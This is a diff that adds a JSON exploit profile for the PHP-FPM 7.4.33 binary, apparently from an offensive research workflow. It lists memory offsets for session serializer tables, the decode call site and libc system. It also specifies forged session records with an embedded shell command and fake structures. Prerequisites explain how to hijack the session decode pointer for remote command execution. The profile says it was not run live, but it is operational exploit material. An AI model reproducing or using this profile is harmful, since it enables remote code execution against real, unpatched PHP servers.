@@ -1,0 +1,148 @@
+{
+  "name": "g2-fpm-7433-minfpm",
+  "lane": "fpm",
+  "stage": "G2",
+  "status": "offsets derived from the built non PIE FPM binary; G2 not run live",
+  "php_version": "7.4.33",
+  "binary": "/tmp/opencode/research/veroff_20261021_215718/build/php-7.4.33/sapi/fpm/php-fpm",
+  "build_id": "1f996193caece78f0f794fb83c3c60707a068ce1",
+  "md5": "9c7b5c2287fdebe6b3324223034715da",
+  "size_bytes": 22764672,
+  "elf_type": "EXEC",
+  "pie": false,
+  "align16": true,
+  "image_base": "0x400000",
+  "serializer": "php_binary",
+  "md5_lock": "select this profile only when the target binary md5 matches; a mismatch invalidates every offset",
+  "structs": {
+    "ps_serializer_size": 24,
+    "ps_serializer_name": 0,
+    "ps_serializer_encode": 8,
+    "ps_serializer_decode": 16,
+    "php_unserialize_data_size": 8216,
+    "php_unserialize_data_last": 0,
+    "php_unserialize_data_first_dtor": 8,
+    "php_unserialize_data_last_dtor": 16,
+    "php_unserialize_data_max_depth": 48,
+    "php_unserialize_data_entries": 56,
+    "var_dtor_entries_size": 4096,
+    "var_dtor_entries_used_slots": 0,
+    "var_dtor_entries_next": 8,
+    "var_dtor_entries_data": 16,
+    "var_entries_max": 1018,
+    "var_dtor_entries_max": 255,
+    "ps_globals_serializer": "0x130",
+    "bg_unserialize_data": "0xdc0",
+    "bg_unserialize_level": "0xdc8"
+  },
+  "ps_globals": "0xe02cc0",
+  "ps_serializers": {
+    "table": "0xe01060",
+    "terminator": "0xe010a8",
+    "active_serializer_slot": "0xe02df0",
+    "active_serializer_ps_globals_offset": "0x130",
+    "default_target": "0xe010a0",
+    "default_handler": "php",
+    "default_php_decode": "0xe01088",
+    "default_php_decode_16b_aligned": false,
+    "note": "the default php decode slot is not 16 byte aligned; with session.serialize_handler=php, target ps_serializer_slot and point it at a fake ps_serializer struct in the record",
+    "entries": [
+      {
+        "index": 0,
+        "name": "php_serialize",
+        "name_addr": "0xe01060",
+        "encode": "0xe01068",
+        "decode": "0xe01070",
+        "decode_16b_aligned": true
+      },
+      {
+        "index": 1,
+        "name": "php",
+        "name_addr": "0xe01078",
+        "encode": "0xe01080",
+        "decode": "0xe01088",
+        "decode_16b_aligned": false
+      },
+      {
+        "index": 2,
+        "name": "php_binary",
+        "name_addr": "0xe01090",
+        "encode": "0xe01098",
+        "decode": "0xe010a0",
+        "decode_16b_aligned": true
+      }
+    ]
+  },
+  "ps_serializer_slot": {
+    "address": "0xe02df0",
+    "ps_globals": "0xe02cc0",
+    "offset": "0x130",
+    "aligned_16b": true,
+    "note": "write the fake ps_serializer struct address here; the fake struct is 24 bytes, name at +0, encode at +8, decode at +0x10"
+  },
+  "decode_call": {
+    "php_session_decode": "0x6d582a",
+    "call_indirect": "0x6d5847",
+    "call_form": "call *0x10(%rax)",
+    "rdi": "ZSTR_VAL session record",
+    "rsi": "ZSTR_LEN session record",
+    "note": "the decode pointer is read from PS(serializer) on every decode, so the write is consumed by the forced END update in the same request"
+  },
+  "zend_eval_string": "0x7cd5ab",
+  "zend_eval_stringl": "0x7cd343",
+  "record": {
+    "format": "php_binary",
+    "x_mapping": "file byte i maps to ZSTR_VAL + i; ZSTR_VAL = X + 24",
+    "rec1": "[0x20][32 byte command][i:<n>;]",
+    "rec2": "[0x01]['z']s:<L>:\"<payload>\";",
+    "command_rule": "the 0x20 key length byte is the leading space of the shell command; the command is padded to 32 bytes and must end in # so the value text is commented out",
+    "fake_p": {
+      "last": "P + 56",
+      "first_dtor": "B0",
+      "last_dtor": "B0",
+      "max_depth": "0x7fffffff",
+      "entries_used_slots": 1018,
+      "bytes_written": 72
+    },
+    "fake_b0": {
+      "used_slots": "used_slots",
+      "next": 0,
+      "bytes_written": 16
+    },
+    "lab_geometry": {
+      "total": 131014,
+      "note": "record length from the 8.5.10 receipt; X, P and B0 are operator supplied and are not part of this profile"
+    }
+  },
+  "libc": {
+    "system_offset": "0x53090",
+    "popen_offset": "0x7ff90",
+    "note": "lab glibc build only; system is not imported by php-fpm, so a libc base leak is required; popen takes a second argument the decode call site does not control"
+  },
+  "heap_leak": {
+    "status": "F14 pending",
+    "note": "no ASLR capable heap leak; the G2 plan needs operator supplied X, P and B0"
+  },
+  "prerequisites": [
+    "md5 locked: the target binary must match this profile md5",
+    "non PIE ET_EXEC binary with image base 0x400000",
+    "libc base for system (offset 0x53090), or a fixed call target; system is not imported",
+    "heap addresses X, P and B0 and the exact record length",
+    "upload progress enabled with the forced END update in the same request",
+    "the plant request must be the immediately preceding request on the same worker",
+    "single shot per plant: RINIT resets BG(unserialize), and the corrupted decode pointer persists until worker restart",
+    "with session.serialize_handler=php, target ps_serializer_slot and point it at a fake ps_serializer struct; the php decode slot is not 16 byte aligned"
+  ],
+  "caveats": [
+    "offsets are from a locally built non PIE FPM binary; this build was not run live",
+    "a binary md5 mismatch invalidates every offset",
+    "the default php serializer decode slot is not 16 byte aligned; the PS(serializer) pointer slot plus a fake ps_serializer struct is the target for that handler",
+    "zend_eval_string is not a valid decode target: rsi is ZSTR_LEN and zend_eval_stringl treats a non NULL retval_ptr as a zval and does ZVAL_COPY_VALUE, a wild write for a nonzero length",
+    "5.x cannot reuse this geometry: php_unserialize_data is {first, last, first_dtor, last_dtor}, dtor entries use zval *data[1024] with used_slots at +0x2000 and next at +0x2008, the bound is equality, and BG(unserialize) is a struct not a pointer",
+    "no claim is made for other session savers, opcache, ZTS or shared pools"
+  ],
+  "receipts": {
+    "V6": "/tmp/opencode/research/veroff_20261021_215718"
+  },
+  "eol": "2022-11-28"
+}
